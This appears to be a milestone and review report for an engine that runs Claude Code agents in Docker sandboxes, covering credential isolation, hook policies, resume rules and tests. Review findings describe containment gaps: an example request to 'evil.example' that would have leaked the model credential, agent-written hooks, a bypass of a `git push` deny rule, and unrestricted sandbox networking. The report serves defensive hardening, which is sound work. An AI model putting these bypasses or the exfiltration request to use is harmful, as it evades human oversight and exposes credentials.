# M4: agent steps in a sandbox

Status: built 2026-11-02 on branch `m4-agent-steps`, based on `main` at `6734f3f`.
An implementer step on the fixture repository `ai-feature-flow/feature-flow-example`
committed, and the commit appeared on the hidden reference while the agent's
session ran, then on the work branch when the step finished: M4's done-when,
shown by a Live test with the real model. SP2, SP3 and SP5 are tests, each run
with a scripted model in the Integration category and with the real model in
the Live category. A worker killed mid-step resumes from the same sandbox. M3
follow-up 9 is fixed: a cancelled agent step is waited for. Each of the
thirty-four negative controls, fifteen of them added after review, made its tests fail while the rule was broken
(section 2.6). LOG 91 to 106 are new and unreviewed. The M4 review's changes are in
section 10.

## 1. What was built

| Project | Holds |
|---|---|
| `Providers.Abstractions` | The sandbox provider (`ISandboxProvider`), the VCS provider's M4 subset (`IVcsProvider`), the credential broker (`ICredentialBroker`) with typed scopes, the agent runtime's session re-attach and continuation, and the agent step's records: the step attempt, report calls, questions and events (LOG 103). `StepCall` and `StepOutcome` moved here (LOG 92) |
| `Engine.Agent` | `AgentActivities`, the agent step's lifecycle (`docs/04` section 3.1); `AgentEndpoint`, the hook endpoint, the engine tools (`report`, `ask_human`) and the model proxy on the agent worker (LOG 68); `StepTokens`, HMAC-signed per-step tokens any replica checks (RW17); `ReportCheck`, the report's contract check; `HookPolicy`; `ModelProxy` |
| `SandboxClient` | `ff-sandbox`, one self-contained executable (LOG 67): `ff-sandbox mcp`, the stdio MCP server for the engine tools, and `ff-sandbox hook <event>`, the hook command. Both move to another replica on a connection error, hold for a bounded time, and end the session resumably when the engine stays unreachable (LOG 59, 60) |
| `Providers.Docker` | `DockerSandbox`: one container per step named from the step's key; commands started detached and polled through files; copy in and out; read-only paths; the home and its empty startup files. `sandbox.Dockerfile`: `node:24-bookworm-slim`, git and Claude Code 2.1.316 |
| `Providers.ClaudeCode` | `ClaudeCodeRuntime`: `claude -p` in the sandbox with stream-json output, a session id fixed by the step's key, settings, hooks and MCP server only from the engine (LOG 100), and the result read from the transcript |
| `Providers.Git` | `GitVcs`: a bare clone cache on the worker; checkout into a sandbox by bundle (LOG 95); commit detection; commits out as a bundle; pushes with an expected old revision; the engine's credential given to `git` in its environment only |
| `Providers.GitHub` | `AppCredentialBroker`, ported from Spike 2: the App's JWT, installation tokens scoped to the request, and refusal of a wider request before any call to GitHub |
| `Providers.Local` | SQLite tables for the agent step records; `from_environment` for file secrets (LOG 91) |
| `Engine` | The workflow calls `RunAgentStep` by name with the step's settings: role, rendered task, limits, branches and consumed artifacts. Questions held by the shell (LOG 93). Step activities wait for cancellation, and the run waits for them at its end (LOG 102) |
| `Interpreter` | Task rendering (`RenderTask`) and the work branch from `metadata.branch_pattern` (`WorkBranch`, LOG 97); the question signal and its carried state in `Wire.cs` |
| `Model` | The installation's `agent_worker` section (LOG 91) |
| `Hosting` | The agent worker registers `AgentActivities` and, with `agent_worker.listen`, serves the endpoint; the model proxy is configured from the default runtime's `model_access` |
| `hosts/*` | Each host registers the Docker, Claude Code, Git and GitHub provider factories |

The agent step, as built:

1. **Prepare.** Record the attempt and issue the step's token. Read the parent
   and work branches; create the work branch from the parent if it does not
   exist. Re-attach to the step's sandbox, or create one: copy in the sandbox
   client, configure git, check out from the hidden reference if an earlier
   attempt pushed there, else from the work branch; stage the inputs manifest,
   consumed artifacts and skills read-only; make the checkout read-only for a
   role with no write access. The output folder and home exist before the
   agent starts (DR17, DR19).
2. **Start.** Compose the prompt: the library's reporting preamble, where the
   step's files are, and the task the workflow rendered. Start Claude Code with
   the step's token and the proxy's URL, or re-attach to its session. The prompt
   is stored as an artifact and its hash is on the timeline (`docs/03` section 6.3).
3. **Supervise.** Heartbeat; every `commit_interval`, push new commits to the
   hidden reference as a bundle.
4. **Collect and verify.** Take the last accepted report from the record store,
   else the `report.json` fallback, checked with correction turns (LOG 94). A
   session stopped by an unreachable model or engine is an infrastructure
   failure, and the retry continues it (LOG 98).
5. **Finish.** Commit leftovers unless `on_uncommitted: fail`; refuse commits
   from a read-only role; push; copy out the artifacts; publish `commits`,
   `changed_files_unread` and `coverage_known` (LOG 99); move the work branch
   once; remove the sandbox.

## 2. Checks

### 2.1 Done when

| Test | Shows |
|---|---|
| Live: `An_implementer_step_on_the_fixture_repository_commits_to_the_hidden_reference_then_the_work_branch` | On `ai-feature-flow/feature-flow-example`, with the real model and the GitHub App: the agent created a file and committed it. The commit was on the hidden reference while the run ran and the work branch was still at `main`; at the end the work branch held the same commit. The test then removes both references |
| Integration: `An_implementer_step_commits_to_the_hidden_reference_then_the_work_branch` | The same against a local bare repository and a scripted model, plus: the hidden reference was first seen before the agent's session ended, so commit detection pushed it, not the finish |

### 2.2 SP2: a question across an agent worker restart

`AgentResumeTests.A_question_is_answered_after_the_agent_worker_is_restarted`:
the agent worker runs in a host of its own. Once the question is open, the
worker stops; the person answers through the API while no worker runs; a new
worker starts. The agent receives the answer (a nonce) once, from the one
question; the sandbox client's log shows a connection failure and the answer
received (E1); the new worker re-attached to the sandbox the first created.

### 2.3 SP3's tasks as contract tests

| Task | Integration (scripted model) | Live (real model) |
|---|---|---|
| Report | Every test that completes | The done-when |
| Correct | `A_rejected_report_is_corrected_within_the_correction_turns`: the first report lacks an output, is rejected with "correction turn 1 of 2", and the second is accepted | `A_rejected_report_is_corrected_by_the_real_agent` |
| Fall back | `Without_the_report_tool_the_agent_reports_through_a_file_in_its_output_folder`: no engine tools offered; the report arrives as `report.json` | `Without_the_report_tool_the_real_agent_reports_through_a_file` |
| Wait | `A_question_waits_for_the_answer_given_through_the_api` | `A_question_is_answered_after_the_agent_worker_is_restarted` (live) |
| Stop | `Reports_still_invalid_after_the_correction_turns_fail_the_attempt`: three rejections, the third saying the attempt has failed; the step escalates | `The_real_agent_stops_when_the_attempt_has_failed` |

### 2.4 SP5's checks

| Check | Test |
|---|---|
| No credential in the sandbox's environment, home or transcript | `The_sandbox_holds_no_model_credential_in_its_environment_home_or_transcript`: the agent records `env`, every process environment its user can read (Claude Code removes its own credential variables from its tools' shells, so `env` alone would miss one given to the runtime; section 2.6), its home and the size of its startup files. The environment holds the proxy's URL and the step's token, `HOME=/ff/home` and empty startup files, and neither `CLAUDE_CODE_OAUTH_TOKEN` nor `ANTHROPIC_API_KEY`; neither the proxy's credential nor the operator's own token is in the agent's view or the transcript. Every model request reached the model with the proxy's credential. Live: `The_real_agent_s_sandbox_holds_no_model_credential` |
| With the proxy unreachable the step stops resumable rather than succeeding | `With_the_model_unreachable_the_step_stops_resumably_rather_than_succeeding`: the model's API is not listening. The session ends on an API error; the activity fails as infrastructure three times and more, the run stays `running` with no intervention and no attempt used. When the API starts listening, the next retry continues the session in the same sandbox and the step completes |

### 2.5 Further checks

| Requirement | Test |
|---|---|
| A worker killed mid-step resumes from the same sandbox | `A_worker_killed_mid_step_resumes_from_the_same_sandbox`: the worker stops while the agent runs a 25-second command after committing; the new worker re-attaches to the sandbox and the running session (one session, no second sandbox), and the step completes with the commit |
| DR16 | `The_runtime_s_tool_and_hook_timeouts_exceed_the_waits_they_carry` |
| DR17 | The fall-back test: the agent's first command finds `/ff/out` empty and owned by the agent's user |
| DR19 | The SP5 test above; `The_runtime_s_environment_holds_the_step_token_and_no_model_credential` |
| DR20 | The model proxy and the broker use .NET's default handler, which validates with the platform's trust store. The Live runs reached the Anthropic API and GitHub from a Mac behind TLS inspection, where SP5's Python proxy needed the system roots added. No test fails if a custom callback is added |
| LOG 59 | `A_question_keeps_its_id_across_replicas_and_returns_the_answer`; `A_question_opened_twice_with_one_id_is_one_question_signalled_once` |
| LOG 60 | `An_engine_unreachable_past_the_budget_ends_the_session_and_gives_the_agent_no_error`; `The_hook_command_holds_while_no_replica_answers_and_then_stops_the_session_rather_than_deny` |
| Hooks | `Hooks_deny_a_push_and_record_the_files_the_agent_read`: `git push` denied with its reason; `commits=1 changed_files_unread=1 coverage_known=true` |
| Write access enforced twice | `A_role_with_no_write_access_cannot_change_its_checkout`: no editing tool offered, and a shell write fails with "Permission denied" |
| M3 follow-up 9 | `An_aborted_run_waits_for_its_agent_step_to_stop`: when the aborted run's workflow has ended, the agent has stopped and its sandbox is gone |

### 2.6 Controls

`tools/check_m4_controls.py` breaks each rule in the source, runs the tests
that guard it, restores the source and runs them again. It exits 0 only when
each control's named tests fail while broken and pass after the revert. All
nineteen held, against a dev server on port 8033 with Docker:

| Control | Tests failing while broken |
|---|---|
| SP2 N1a: the client gives up at its first connection error | SP2 restart test; the client's failover, held-hook and non-JSON tests |
| SP2 N1b: an unreachable engine is returned to the agent as a tool error (LOG 60) | `An_engine_unreachable_past_the_budget_ends_the_session_and_gives_the_agent_no_error` |
| SP2 N2: the hook command fails closed (R19) | `The_hook_command_holds_while_no_replica_answers_and_then_stops_the_session_rather_than_deny` |
| LOG 59: a question is not opened idempotently by its id | `A_question_opened_twice_with_one_id_is_one_question_signalled_once` |
| No correction turns | The endpoint's two correction-turn tests; the integration correction test |
| SP5 N2: the proxy forwards the step's token | Both proxy tests; the integration done-when test (the scripted model refuses the token) |
| F6: the worker's credential passed into the sandbox | The runtime's environment test; the integration SP5 test |
| DR19: the image's home instead of the engine's | The runtime's environment test; the integration SP5 test |
| DR17: no output folder before the agent starts | The fall-back test |
| DR16: a one-minute MCP tool timeout | `The_runtime_s_tool_and_hook_timeouts_exceed_the_waits_they_carry` |
| No commit detection: pushes only after the session ends | The integration done-when test |
| Pushes go to the work branch, not the hidden reference | The integration done-when test |
| A new worker makes a new sandbox instead of re-attaching | Both resume tests |
| The model unreachable read as a work failure (SP5 N1) | `With_the_model_unreachable_the_step_stops_resumably_rather_than_succeeding` |
| M3 follow-up 9: `TryCancel` | `An_aborted_run_waits_for_its_agent_step_to_stop` |
| A read-only role's checkout left writable | `A_role_with_no_write_access_cannot_change_its_checkout` |
| The hook policy lets `git push` through | The four `A_git_push_is_denied` cases; the endpoint's hook test; the integration hooks test |
| A step token's signature not checked | The other-key and changed-claims token tests |
| The broker grants what it should refuse | All five refusal cases |

The first full run held for fifteen. Four did not, and each was fixed and run
again:

| Control | Why it did not hold | Fix |
|---|---|---|
| SP2 N1b | The control's edit left a parameter unread, which warnings-as-errors refuses, so nothing ran | The edit reads the parameter |
| LOG 59 | The long-poll test was named too; it passes anyway, because the record store keeps an answered question answered | The named test is the idempotency test alone |
| F6 | The integration SP5 test passed: Claude Code removes its own credential variables from its tools' shells, so the agent's `env` did not show the credential given to the runtime | The test now also lists every process environment the agent's user can read (`/proc/*/environ`), which shows it. SP5's method, `env` alone, would have missed it |
| Hook policy | The endpoint's hook test used a token without the `shell` class, so `Bash` was denied for that reason | The token has `shell` |

### 2.7 Replay

`tests/histories/agent_question.json` is the history of the question test: an
agent step called by name, a `question_opened` signal, a question timer and
the answer update, with the markers `m4-agent-step` and `m4-wait-cancellation`.
It replays in the default category with the five M3 histories, which also
still replay. The history holds no API token and no model credential (the
recording asserts both) and no local path.

### 2.8 Counts

After the review, the default category has 389 tests, up from M3's 288:
`Validation.Tests` 73, `Engine.Agent.Tests` 64 (new), `Interpreter.Tests` 58,
`Expressions.Tests` 48, `Model.Tests` 26, `Testing.Workflows.Tests` 26,
`Architecture.Tests` 20, `Providers.ClaudeCode.Tests` 16 (new), `Cli.Tests` 15,
`SandboxClient.Tests` 8 (new), `Replay.Tests` 7, `Providers.GitHub.Tests` 7
(new), `Providers.Local.Tests` 7, `Api.Tests` 6, `Library.Tests` 5,
`Hosting.Tests` 3. The integration category has 29, up from 10: M3's ten and
nineteen agent step tests, seven of them added after review; together about
3.5 minutes. The Live category has 6. Before the review the counts were 353 and 22.

## 3. Live runs

All against `ai-feature-flow/feature-flow-example` through the GitHub App, with
Claude Code 2.1.316 and model `haiku` through the proxy holding the
subscription token, on 2026-11-02. Each test removes the branch and hidden
reference it pushed, except the first done-when run (below).

| Run | Test | Result |
|---|---|---|
| 1 | Done-when, alone | Passed in 55 s. Its clean-up failed silently (it ran `git push` outside a repository) and left two references (follow-up 12). The clean-up now checks its exit code |
| 2 | All six | Four passed: the done-when, SP2's restart, SP3's correction (rejected for a missing output, then accepted) and SP5. Two failed, both in the test's expectation, not the engine: SP3's stop expected exactly three rejections and the agent stopped after two, as SP3's N2 saw, the step then failing as designed; SP3's fall-back saw the agent answer in chat instead of writing `report.json`, and the attempt failed as designed |
| 3 | Fall-back and stop, after changes | Both passed. The runtime now tells the agent, in its prompt, that the report tool is absent. The agent's first `report.json` had an empty summary; it was rejected and corrected in a continued session. The stop test now accepts either way the attempt fails |
| 4 | All six, final code | Five passed: the done-when (hidden reference `507ceb7f60` seen while the branch was at `main`, then the branch moved to it), SP2's restart, SP3's correction, fall-back (rejected, then corrected) and stop (two rejections, then the agent stopped; the attempt failed). SP5 failed: asked also to list every process environment, the real agent reported `blocked` |
| 5 | SP5 with `env` only | Passed: no credential name or value in the environment or transcript, empty startup files. The process-environment listing stays in the Integration test, where its control holds |
| 6 | Done-when and SP5, after the review's changes (managed hook settings, the set-user-id client, the proxy allowlist) | Both passed. The done-when's commit `afec175466` was on the hidden reference while the branch was at `main`, then on the branch. No reference was left on the fixture |

The model requests per run, from the proxy's records, were between 2 and 6.

## 4. Design changes

LOG 91 to 106, unreviewed; 91, 96, 97, 98 and 100 were revised and 104 to 106 added after the
review (section 10). Notes saying "Pending review (LOG n)" mark the
sections they touch: `docs/04` sections 3.3, 3.4 and 3.6, `docs/06` sections 3
and 3.13, and `docs/07` section 2.

| LOG | Change |
|---|---|
| 91 | The installation's `agent_worker` section; `model_access` gains `upstream` and `auth`; file secrets gain `from_environment` |
| 92 | The agent step's activity lives in `Engine.Agent` and is called by name |
| 93 | Questions are held by the workflow shell, answered through the API |
| 94 | Reports are checked on the agent worker, so correction turns happen in the session; supersedes LOG 89 for agent reports |
| 95 | No code host credential enters the sandbox; the checkout is a bundle. **Narrower than `docs/06` section 3.13** |
| 96 | The hidden reference's name and its reuse by later executions |
| 97 | The work branch is created at the first agent step; `run.branch` follows `metadata.branch_pattern` |
| 98 | A session stopped by an unreachable model or engine is infrastructure, and the retry continues it |
| 99 | How the engine counts `commits`, `changed_files_unread` and `coverage_known` |
| 100 | Claude Code takes settings, hooks and MCP servers only from the engine |
| 101 | The hook policy's rules |
| 102 | Cancellation is waited for; a worker shutting down leaves the sandbox |
| 103 | The provider interfaces add methods to `docs/06`'s abbreviated signatures. **Changes approved interface text** |
| 104 | The model proxy forwards only the Messages API, to its upstream. **An F6 breach found in review** |
| 105 | The sandbox client runs set-user-id as an engine state user; no `checkpoint` tool; tokens revoked at the step's end; questions shown only to their step |
| 106 | `limits.timeout` is enforced from the step's first attempt |

## 5. Implementation choices

| Choice | Reason |
|---|---|
| Docker through its command line, not an SDK | No new package; a provider may reference only `Providers.Abstractions` and `Model` |
| A command's process id, output and exit code live in files in the sandbox, and it runs in its own process group | A new worker reads them after a restart; a cancel ends the whole group |
| The sandbox client is copied into each sandbox from the artifact store, 37 MB, single-file and compressed | LOG 67 copies it in; the store keeps one copy |
| The scripted model answers the Messages API, streaming or not, and refuses any credential but its own | The Integration category runs the real Claude Code, sandbox, proxy and tools without a model credential (`spikes/02-real-run/tools/mock-model-router.py`) |
| A long command in the tests is a Node timer | Claude Code refuses a long plain `sleep` |
| `CLAUDE_CODE_MAX_RETRIES` is a runtime setting, 0 in the Integration tests | An unreachable model then ends the session in about a second instead of minutes |

## 6. CI

The workflow's commands were run from a clean clone of `m4-agent-steps` at
`7ee3a3c` on macOS, 2026-11-02, made in the scratchpad and deleted afterwards:

| Job | Commands | Result |
|---|---|---|
| Build and default tests | `dotnet build FeatureFlow.slnx -c Release`; `dotnet test ... --filter "Category!=Integration&Category!=Live"` | 0 warnings, 0 errors; 353 passed, 0 failed |
| Integration tests | The dev server on port 8033 (`FF_TEMPORAL_ADDRESS=localhost:8033`); `docker build` of the sandbox image, as the workflow now does; the same build; `dotnet test ... --filter "Category=Integration"` | 22 passed, 0 failed, in 81 seconds |

The integration job gains one step, building the sandbox image. GitHub CI on
pull request 2 passed both jobs at `b920afb` (default 1 min 48 s, integration
3 min 27 s): the first run on Linux, where the tests publish the sandbox
client for `linux-x64`.

## 7. Open questions

| # | Question |
|---|---|
| 1 | LOG 91 to 106 need review; 91, 95, 103 and 104 change or bear on approved text |

## 8. Follow-ups

Not done in M4:

| # | Follow-up |
|---|---|
| 1 | The repository manifest's `setup` and `after_changes` commands are not run, and the sandbox is not built from the manifest: no step reads `feature-flow.yaml` before M5 (`docs/04` section 3.1, steps 1 and 6) |
| 2 | An agent step works on one repository, the run's first |
| 3 | The parent branch is `main`, as in M3's run values, until M5 reads the default branch from the code host |
| 4 | The agent gets no read-only code host credential (LOG 95) |
| 5 | `inspect_plan`, `propose_patch`, `run_check` and `checkpoint` are not offered (LOG 105) |
| 6 | The step's summary is not appended to the run context (`docs/04` section 3.5); toolsets are not proxied (`docs/06` section 3.9) |
| 7 | Question waits do not pause the step's timeout (LOG 106); the question's timer is not cancelled when it is answered (it fires and does nothing) |
| 8 | A `with` value that is an artifact is not staged and rendered as a path (`docs/03` section 6.3); consumed artifacts are the latest of their name, as `plan.expand` reads them (M3 follow-up 3) |
| 9 | Tokens and model per step are recorded as events from the proxy, not as cost records (`docs/02` section 8) |
| 10 | SP3's tasks are tests in `FeatureFlow.Integration.Tests` and `FeatureFlow.Live.Tests`, not a contract suite in `Providers.Contracts` that another runtime could run |
| 11 | The Docker sandbox applies no network policy or resource limits (its capabilities say so) |
| 12 | **Must fix before any shared deployment** (review finding 13): the sandbox's network is unrestricted, and `host-gateway` reaches every service on the worker's host, the Temporal frontend included |
| 13 | DR20, the platform trust store, has no test (section 2.5) |

## 9. M3 follow-ups

| M3 follow-up | State |
|---|---|
| 9: step activities use `TryCancel` | Fixed (LOG 102), with a control |
| 1 to 8, 10, 11 | Unchanged |

## 10. Review changes

The M4 review of pull request 2 asked for these changes, made at `8fba684` and
after. Each has a test; each blocking one, and most others, a control
(`tools/check_m4_controls.py`, "review 1" to "review 17"). All thirty-four
controls were run again on the revised code and held.

| # | Finding | Change | Test |
|---|---|---|---|
| 1 | **F6 breach**: the proxy built its target from the agent's path, so `POST /model/https://evil.example/steal` sent the credential to that host | Only `POST v1/messages` and `v1/messages/count_tokens`, relative, on the upstream's scheme, host and port; anything else is refused with 404 before the credential is read (LOG 104) | Six refused requests, none reaching the upstream or reading the credential; the target check; in the sandbox, the agent's `fetch` of an absolute URL through the proxy gets 404 |
| 2 | A later execution checked out a stale hidden reference and a forced push could rewind the branch | The hidden reference is used only when it descends from the branch; the branch moves only to a commit that descends from its revision at the step's start (LOG 96) | `A_later_execution_starts_from_the_branch_when_the_hidden_reference_is_behind_it`; `A_final_commit_that_does_not_build_on_the_branch_is_not_pushed_to_it` |
| 3 | A new sandbox ran `claude --resume` on a session it did not hold | A fresh session, told the attempt was interrupted (`docs/04` section 3.2) | `A_lost_sandbox_is_replaced_and_a_fresh_session_is_told_it_was_interrupted` |
| 4 | `limits.timeout` was not enforced | A deadline from the first attempt, kept in the record store; the session is stopped and the attempt fails as out of time (LOG 106) | `A_step_past_its_timeout_is_stopped_and_fails_as_out_of_time` |
| 5 | Resumes were unbounded and free, and the agent could trigger one | Engine state written by a set-user-id client; permanent model errors not resumable (401 and 403 stop for a person); a resume free only after progress; 5 in a row without progress or 20 in all stop for a person (LOG 98, 105) | `Resumes_without_progress_stop_for_a_person_after_the_cap`; `Only_transient_api_errors_are_resumable`; the boundary test's attempt to write `/ff/state` |
| 6 | A hook answered with no decision allowed the call | The hook fails closed: anything but `allow` blocks | `The_hook_command_fails_closed_on_an_answer_with_no_decision` |
| 7 | The agent could add hooks through its writable user settings | Hooks in root-owned managed settings with `allowManagedHooksOnly` (LOG 100) | The boundary test: the agent cannot change the managed settings, and a hook it writes into its user settings does not run in the next session |
| 8 | Missing proof | Tests added | `A_work_branch_moved_by_someone_else_during_the_step_fails_the_attempt`; `.git` and tool-class theories in `ReportAndHookTests` |
| 9 | Live clean-up | Runs are aborted and waited for before references are removed; the clean-up no longer asserts. Follow-up 12 of the first version (two leftover references) is removed: the coordinator deleted them with the product owner's approval | The final Live runs left no reference |
| 10 | Sandbox leaks | A step that cannot answer, and a cancellation during preparation, remove the sandbox | The cap test checks the sandbox is gone |
| 11 | Tokens outlived their step | Revoked when the attempt ends (LOG 105) | `A_revoked_step_s_token_is_refused` |
| 12 | Any step could open another's question | Ownership checked | `A_question_of_another_step_is_not_shown` |
| 14 | LOG 91 incomplete | LOG 91 lists every new key; `engine_tools: false` is refused unless `development: true` | A configuration test |
| 15 | `run.branch` changed without versioning | Behind the patch marker `m4-branch-pattern` (LOG 97) | The recorded histories replay |
| 16 | The broker control passed on any one refusal | It asks for all five cases | The control |
| 17 | `git push` matched by a literal prefix | Matched by command name, so `/usr/bin/git push` is denied | Two more `A_git_push_is_denied` cases |
| - | `CONTRIBUTING.md`'s co-author line | Now the Claude line the commits use | - |

Recorded, not fixed: finding 13 (follow-up 12) and DR20's missing test
(follow-up 13).
